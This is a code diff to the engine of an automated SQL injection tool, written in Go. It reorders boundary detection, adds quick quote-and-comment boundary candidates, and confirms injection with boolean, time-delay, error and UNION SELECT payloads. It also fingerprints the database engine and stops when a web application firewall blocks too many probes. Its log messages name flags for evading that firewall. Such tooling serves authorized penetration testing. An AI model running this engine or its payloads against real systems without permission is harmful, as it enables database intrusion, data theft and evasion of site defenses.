@@ -3,6 +3,7 @@ package core
 import (
 	"fmt"
 	"strings"
+	"sync/atomic"
 	"time"
 )
 
@@ -37,17 +38,64 @@ func BoundaryCandidates() []BoundaryCandidate {
 	}
 }
 
-// DetectBoundary finds a working prefix/suffix pair and the first technique
-// that proves the injection. It returns the boundary, the technique name, the
-// exact proof payload, and whether a usable boundary was found.
-func (e *Engine) DetectBoundary(point InjectionPoint, baseBody string) (Boundary, string, string, bool) {
-	candidates := BoundaryCandidates()
-	forced := e.Opts.Prefix != "" || e.Opts.Suffix != ""
-	if forced {
-		candidates = []BoundaryCandidate{{Prefix: e.Opts.Prefix, Suffix: e.Opts.Suffix}}
+// quickBoundaryCandidates are the contexts that cover almost every real
+// application. The longer list is only tried when none of these work.
+func quickBoundaryCandidates() []BoundaryCandidate {
+	return []BoundaryCandidate{
+		{"'", "-- -"},
+		{"'", "#"},
+		{"'", "-- "},
+		{"\"", "-- -"},
+		{"", ""},
+		{")", "-- -"},
+		{"')", "-- -"},
+		{"'))", "-- -"},
 	}
+}
 
-	techniques := []string{"boolean", "time", "error", "union"}
+// boundaryDialects limits fingerprint probes to engines that are plausible for
+// the target. Probing every dialect for every candidate is what made a scan
+// look hung.
+func (e *Engine) boundaryDialects() []*Dialect {
+	if d := GetDialect(e.Opts.DBMS); d != nil {
+		return []*Dialect{d}
+	}
+	var out []*Dialect
+	seen := map[string]bool{}
+	add := func(name string) {
+		d := GetDialect(name)
+		if d == nil || seen[d.Name] {
+			return
+		}
+		seen[d.Name] = true
+		out = append(out, d)
+	}
+	body := e.BaselineBody
+	if body == "" {
+		body = e.LastResponseBody
+	}
+	if hint := DetectDBMS(body, e.LastResponseHeaders); hint != "Unknown" && hint != "" {
+		add(hint)
+	}
+	for _, name := range []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite", "Oracle"} {
+		add(name)
+	}
+	return out
+}
+
+// probe sends one boundary payload. Blocked responses are counted so the
+// caller can stop when the WAF rejects everything.
+func (e *Engine) probe(point InjectionPoint, c BoundaryCandidate, fragment string) (string, int, error) {
+	body, length, _, err := e.RequestAt(point, c.Prefix+fragment+c.Suffix)
+	return body, length, err
+}
+
+// DetectBoundary finds a working prefix/suffix pair and the first technique
+// that proves the injection. It is ordered cheapest-first and stops as soon as
+// a proof lands.
+func (e *Engine) DetectBoundary(point InjectionPoint, baseBody string) (Boundary, string, string, bool) {
+	forced := e.Opts.Prefix != "" || e.Opts.Suffix != ""
+	techniques := []string{"error", "boolean", "time", "union"}
 	switch strings.ToLower(strings.TrimSpace(e.Opts.Technique)) {
 	case "", "auto":
 		// Keep the default order.
@@ -56,70 +104,143 @@ func (e *Engine) DetectBoundary(point InjectionPoint, baseBody string) (Boundary
 	case "boolean", "time", "error", "union":
 		techniques = []string{strings.ToLower(e.Opts.Technique)}
 	case "stacked":
-		// Stacked queries cannot be proven with a scalar comparison. Treat
-		// the request as a union probe, which is the closest safe fallback.
 		techniques = []string{"union"}
 	}
 
-	for _, technique := range techniques {
-		for _, c := range candidates {
-			switch technique {
-			case "boolean":
-				if ok, proof := e.testBoundaryBoolean(point, c, baseBody); ok {
-					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, "boolean", proof, true
+	if forced {
+		c := BoundaryCandidate{Prefix: e.Opts.Prefix, Suffix: e.Opts.Suffix}
+		for _, technique := range techniques {
+			if ok, proof := e.probeBoundary(point, c, technique, baseBody); ok {
+				return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, technique, proof, true
+			}
+		}
+		return Boundary{}, "", "", false
+	}
+
+	tried := map[string]bool{}
+	run := func(candidates []BoundaryCandidate) (Boundary, string, string, bool) {
+		for _, technique := range techniques {
+			for _, c := range candidates {
+				key := c.Prefix + "\x00" + c.Suffix
+				if tried[key] {
+					continue
 				}
-			case "time":
-				if ok, proof := e.testBoundaryTime(point, c); ok {
-					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, "time", proof, true
+				tried[key] = true
+				if e.expired() {
+					e.outOfTime("boundary detection")
+					return Boundary{}, "", "", false
 				}
-			case "error":
-				if ok, proof := e.testBoundaryError(point, c); ok {
-					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, "error", proof, true
+				if atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
+					e.Log.Warning("the target keeps rejecting SQL payloads; stopping boundary detection")
+					e.Log.Warning("retry with --bypass-waf, --tamper space2comment, or a manual --prefix/--suffix")
+					return Boundary{}, "", "", false
 				}
-			case "union":
-				if ok, proof := e.testBoundaryUnion(point, c, baseBody); ok {
-					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, "union", proof, true
+				e.Log.Info(fmt.Sprintf("probing %s boundary %q / %q", technique, c.Prefix, c.Suffix))
+				if ok, proof := e.probeBoundary(point, c, technique, baseBody); ok {
+					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, technique, proof, true
 				}
 			}
 		}
+		return Boundary{}, "", "", false
 	}
 
-	return Boundary{}, "", "", false
+	if boundary, technique, proof, ok := run(quickBoundaryCandidates()); ok {
+		return boundary, technique, proof, true
+	}
+	if e.expired() {
+		return Boundary{}, "", "", false
+	}
+	return run(BoundaryCandidates())
 }
 
-func (e *Engine) testBoundaryBoolean(point InjectionPoint, c BoundaryCandidate, baseBody string) (bool, string) {
-	truePayload := c.Prefix + " AND 1=1" + c.Suffix
-	falsePayload := c.Prefix + " AND 1=2" + c.Suffix
+const blockedAbortThreshold = 15
 
-	true1, _, _, err := e.RequestAt(point, truePayload)
-	if err != nil {
-		return false, ""
+// probeBoundary tests one candidate with one technique.
+func (e *Engine) probeBoundary(point InjectionPoint, c BoundaryCandidate, technique, baseBody string) (bool, string) {
+	switch technique {
+	case "error":
+		for _, d := range e.boundaryDialects() {
+			expr, ok := d.ErrorExpr("1")
+			if !ok {
+				continue
+			}
+			fragment := " AND " + expr
+			body, _, err := e.probe(point, c, fragment)
+			if err != nil {
+				continue
+			}
+			if e.Opts.Verbose >= 3 {
+				e.Log.Info(fmt.Sprintf("error probe %s: status=%d len=%d match=%v", d.Name, e.LastStatusCode, len(body), hasDBMSError(body, d.Name)))
+			}
+			if hasDBMSError(body, d.Name) || strings.Contains(body, "~1~") {
+				return true, c.Prefix + fragment + c.Suffix
+			}
+		}
+	case "boolean":
+		forms := [][2]string{
+			{" AND '1'='1", " AND '1'='2"},
+			{" AND 1=1", " AND 1=2"},
+			{" AND 1 LIKE 1", " AND 1 LIKE 2"},
+			{" AND 2>1", " AND 1>2"},
+		}
+		for _, form := range forms {
+			if ok, proof := e.testBoundaryBoolean(point, c, form[0], form[1], baseBody); ok {
+				return true, proof
+			}
+			if e.expired() || atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
+				return false, ""
+			}
+		}
+	case "time":
+		return e.testBoundaryTime(point, c)
+	case "union":
+		return e.testBoundaryUnion(point, c, baseBody)
 	}
-	true2, _, _, err := e.RequestAt(point, truePayload)
-	if err != nil {
-		return false, ""
-	}
-	false1, _, _, err := e.RequestAt(point, falsePayload)
-	if err != nil {
-		return false, ""
-	}
-	false2, _, _, err := e.RequestAt(point, falsePayload)
-	if err != nil {
-		return false, ""
-	}
+	return false, ""
+}
 
-	if !responsesSimilar(true1, true2) || !responsesSimilar(false1, false2) {
+// boolProbe sends one boolean payload. A blocked response means the form is
+// unusable, so the caller skips it instead of spending requests on the pair.
+func (e *Engine) boolProbe(point InjectionPoint, c BoundaryCandidate, fragment string) (string, bool) {
+	for attempt := 0; attempt < 2; attempt++ {
+		body, length, err := e.probe(point, c, fragment)
+		if err == nil {
+			if looksBlocked(e.LastStatusCode, length) {
+				return "", false
+			}
+			return body, true
+		}
+		time.Sleep(300 * time.Millisecond)
+	}
+	return "", false
+}
+
+func (e *Engine) testBoundaryBoolean(point InjectionPoint, c BoundaryCandidate, trueFrag, falseFrag, baseBody string) (bool, string) {
+	e.Log.Debug(fmt.Sprintf("boolean probe %q %q", c.Prefix, strings.TrimSpace(trueFrag)))
+	true1, ok := e.boolProbe(point, c, trueFrag)
+	if !ok {
 		return false, ""
 	}
-	if !responsesDiffer(true1, false1) {
+	false1, ok := e.boolProbe(point, c, falseFrag)
+	if !ok {
 		return false, ""
 	}
-	// The true response should still resemble the original page. If both
-	// responses are error pages, this is not a useful boolean oracle.
+	if !booleanDiffer(true1, false1) {
+		return false, ""
+	}
+	// Confirm both branches are stable before trusting the difference.
+	true2, ok := e.boolProbe(point, c, trueFrag)
+	if !ok || !responsesSimilar(true1, true2) {
+		return false, ""
+	}
+	false2, ok := e.boolProbe(point, c, falseFrag)
+	if !ok || !responsesSimilar(false1, false2) {
+		return false, ""
+	}
 	if similarity(true1, baseBody) < 0.35 && similarity(false1, baseBody) < 0.35 {
 		return false, ""
 	}
-	return true, truePayload
+	return true, c.Prefix + trueFrag + c.Suffix
 }
 
 func (e *Engine) testBoundaryTime(point InjectionPoint, c BoundaryCandidate) (bool, string) {
@@ -128,39 +249,45 @@ func (e *Engine) testBoundaryTime(point InjectionPoint, c BoundaryCandidate) (bo
 	if delay <= 0 {
 		delay = 3
 	}
-	for _, d := range Dialects() {
-		payload := c.Prefix + " AND " + d.TimeCondition("1=1", delay) + c.Suffix
-		samples := []time.Duration{}
-		for i := 0; i < 2; i++ {
-			_, _, _, err := e.RequestAt(point, payload)
-			if err != nil {
-				break
-			}
-			samples = append(samples, e.LastResponseTime)
+	if delay > 3 {
+		delay = 3
+	}
+	dialects := e.boundaryDialects()
+	if len(dialects) > 4 {
+		dialects = dialects[:4]
+	}
+	for _, d := range dialects {
+		if e.expired() {
+			return false, ""
 		}
-		if len(samples) < 2 {
+		fragment := " AND " + d.TimeCondition("1=1", delay)
+		_, _, err := e.probe(point, c, fragment)
+		if err != nil || e.LastResponseTime <= baseline+delayThreshold(delay) {
 			continue
 		}
-		if medianDuration(samples) > baseline+delayThreshold(delay) {
-			return true, payload
+		// One slow sample can be network noise. Confirm it before declaring
+		// the target time injectable.
+		_, _, err = e.probe(point, c, fragment)
+		if err == nil && e.LastResponseTime > baseline+delayThreshold(delay) {
+			return true, c.Prefix + fragment + c.Suffix
 		}
 	}
 	return false, ""
 }
 
 func (e *Engine) testBoundaryError(point InjectionPoint, c BoundaryCandidate) (bool, string) {
-	for _, d := range Dialects() {
+	for _, d := range e.boundaryDialects() {
 		expr, ok := d.ErrorExpr("1")
 		if !ok {
 			continue
 		}
-		payload := c.Prefix + " AND " + expr + c.Suffix
-		body, _, _, err := e.RequestAt(point, payload)
+		fragment := " AND " + expr
+		body, _, err := e.probe(point, c, fragment)
 		if err != nil {
 			continue
 		}
 		if isErrorLike(body, d.Name) || strings.Contains(body, "~1~") {
-			return true, payload
+			return true, c.Prefix + fragment + c.Suffix
 		}
 	}
 	return false, ""
@@ -173,13 +300,13 @@ func (e *Engine) testBoundaryUnion(point InjectionPoint, c BoundaryCandidate, ba
 			nulls[i] = "NULL"
 		}
 		for _, prefix := range []string{" UNION SELECT ", " UNION ALL SELECT "} {
-			payload := c.Prefix + prefix + strings.Join(nulls, ",") + c.Suffix
-			body, length, _, err := e.RequestAt(point, payload)
+			fragment := prefix + strings.Join(nulls, ",")
+			body, length, err := e.probe(point, c, fragment)
 			if err != nil {
 				continue
 			}
 			if !isErrorLike(body, "") && length > 0 && responsesDiffer(body, baseBody) {
-				return true, payload
+				return true, c.Prefix + fragment + c.Suffix
 			}
 		}
 	}
@@ -234,13 +361,21 @@ func (e *Engine) IdentifyDBMS(session *Session) {
 	// Column detection is dialect independent, so do it once before trying
 	// each version expression. This keeps identification fast.
 	if session.Columns <= 0 {
-		if cols, col, ok := e.DetectUnionColumns(session); ok {
-			session.Columns = cols
-			session.StringCol = col
+		// UNION probing is expensive and a target that blocks SQL will reject
+		// every column count. Skip it once the filter is clearly active.
+		if strings.EqualFold(session.Technique, "union") || atomic.LoadInt64(&e.blocked) < 5 {
+			if cols, col, ok := e.DetectUnionColumns(session); ok {
+				session.Columns = cols
+				session.StringCol = col
+			}
 		}
 	}
 
-	for _, d := range Dialects() {
+	for _, d := range e.boundaryDialects() {
+		if e.expired() || atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
+			e.Log.Warning("stopping DBMS identification early; the target filters SQL payloads")
+			return
+		}
 		probe := *session
 		probe.DBMS = d.Name
 		probe.Technique = "union"
@@ -313,7 +448,10 @@ func (e *Engine) identifyVersion(session *Session, d *Dialect) {
 // identifyDBMSTime finds the dialect whose delay primitive actually works. It
 // is used when the target suppresses all boolean and in-band differences.
 func (e *Engine) identifyDBMSTime(session *Session) bool {
-	for _, d := range Dialects() {
+	for _, d := range e.boundaryDialects() {
+		if e.expired() || atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
+			return false
+		}
 		probe := *session
 		probe.DBMS = d.Name
 		probe.Technique = "time"
@@ -327,7 +465,10 @@ func (e *Engine) identifyDBMSTime(session *Session) bool {
 }
 
 func (e *Engine) identifyDBMSBlind(session *Session) bool {
-	for _, d := range Dialects() {
+	for _, d := range e.boundaryDialects() {
+		if e.expired() || atomic.LoadInt64(&e.blocked) > blockedAbortThreshold {
+			return false
+		}
 		probe := *session
 		probe.DBMS = d.Name
 		probe.Technique = "boolean"
